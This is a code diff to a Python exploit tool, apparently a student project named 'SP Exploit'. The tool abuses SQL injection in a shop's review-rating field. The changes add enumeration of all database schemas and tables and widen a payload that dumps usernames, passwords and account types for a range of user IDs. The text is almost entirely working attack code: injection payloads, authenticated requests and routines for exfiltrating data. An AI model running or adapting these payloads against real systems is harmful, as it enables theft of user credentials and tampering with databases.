@@ -50,7 +50,7 @@ def enum_users(useridtoenum , intensity):
     if intensity == 1:
         payload_json = {
             "userid":userid,
-            "rating":f"5, (Select concat('username : ',username,' Password : ',password) from user where userid='{useridtoenum}'),14); -- -"
+            "rating":f"5, (Select concat('username : ',username,'\t\tPassword : ',password , '\t\tType : ' , type) from user where userid='{useridtoenum}'),14); -- -"
         }
     elif intensity ==2:
         payload_json = {
@@ -78,20 +78,22 @@ def find_review_by_id(reviews, target_reviewid):
 def enumeration(option):
     product = 14
     if option == 1:
-        enum_function = "version()"
+        enum_function = "Select version()"
     elif option == 2:
-        enum_function = "user()"
+        enum_function = "Select user()"
     elif option == 3:
-        enum_function = "database()"
-
+        enum_function = "Select database()"
+    elif option == 4:
+        enum_function = "Select group_concat(table_schema,' - ',table_name ,'|') from information_schema.tables"
     payload_json = {
         "userid":userid,
-        "rating":f"5, (Select {enum_function}),14); -- -"
+        "rating":f"5, ({enum_function}),14); -- -"
     }
     result = requests.post(f'{WebsiteIP}/product/{product}/review/', headers={'Content-Type': 'application/json','authorization':jwt_token}, json=payload_json)
     return result.json()
 
 def modify_product(product_id,product_name,product_description,product_categoryid,product_brand,product_price):
+
 
     payload_json = {
         "name" : product_name,
@@ -115,6 +117,11 @@ def find_product_by_id(products, product_id):
             return product
     return None
 
+def enum_databases():
+
+    result = requests.get(f'{WebsiteIP}/product', headers={'Content-Type': 'application/json','authorization':jwt_token})
+    return result.json()
+
 def main():
     ascii_logo()
     while True:
@@ -122,9 +129,9 @@ def main():
         print("SP Exploit - By Sora / Jun Yu\n[1] Enumeration\n[2] UserData Exfiltration\n[3] Modifying Product Details\n[4] Exit",tag="Info" , tag_color="cyan",color="white")
         menu_option = int(input(">>> "))
         if menu_option == 1:
-            submenu_option = int(input(" -- Enumeration -- \n[1] MYSQL DB Version\n[2] Current User Account\n[3] Current Database\n>>> "))
-            result = enumeration(submenu_option)
+            submenu_option = int(input(" -- Enumeration -- \n[1] MYSQL DB Version\n[2] Current User Account\n[3] Current Database\n[4] All Databases\n>>> "))
 
+            result = enumeration(submenu_option)       
             try:
                 if result['reviewid']:
                     # retrieves array of dictionaries of reviews
@@ -132,14 +139,22 @@ def main():
                     # loops through using a function to find the review content of the review id generated above
                     found_review = find_review_by_id(reviews, result['reviewid'])
                     if found_review:
-                        print(f"Reponse found:\n{found_review['review']}\n" ,tag="Success",tag_color="green" ,color="yellow")
+                        if submenu_option == 4:
+                            cleaned_database_table = found_review['review'].replace(",","")
+                            database_table = cleaned_database_table.split("|")
+                            print(f"Generating Table..." ,tag="Success",tag_color="green" ,color="yellow")
+                            print(f"---- Table ----\n" ,color="purple")
+                            for i in range(len(database_table)):
+                                print(database_table[i],color="yellow")
+                        else:
+                            print(f"Reponse found:\n{found_review['review']}\n" ,tag="Success",tag_color="green" ,color="yellow")
                     else:
                         print(f"No review found with reviewid {result['reviewid']}")
             except:
                 continue
         elif menu_option == 2:
             accountlooprange = int(input("Enter range of userid to exfiltrate data: "))
-            intensity = int(input("Choose the intensity of the data exfiltration.\n[1] Username - Password\n[2] Userid - Username - email - contact - password - type - profile_pic_url - created_at\n>>> "))
+            intensity = int(input("Choose the intensity of the data exfiltration.\n[1] Username - Password - Type\n[2] Userid - Username - email - contact - password - type - profile_pic_url - created_at\n>>> "))
             userdata = ''
             print("Exploiting...\n",tag='Running', tag_color='green', color='white')
             for i in range(accountlooprange):
@@ -161,7 +176,7 @@ def main():
             print("Exploit Complete! Printing...",tag='Success', tag_color='green', color='white')
             print("-- FORMAT --",tag='Info', tag_color='cyan', color='white')
             if intensity == 1:
-                print("USERNAME : <USERNAME> PASSWORD : <PASSWORD>",tag='Info', tag_color='cyan', color='white')
+                print("USERNAME : <USERNAME> \t PASSWORD : <PASSWORD> \t TYPE : <TYPE>",tag='Info', tag_color='cyan', color='white')
             elif intensity == 2:
                 print("Userid - Username - email - contact - password - type - profile_pic_url - created_at",tag='Info', tag_color='cyan', color='white')
             print("----- Table -----", color='purple')
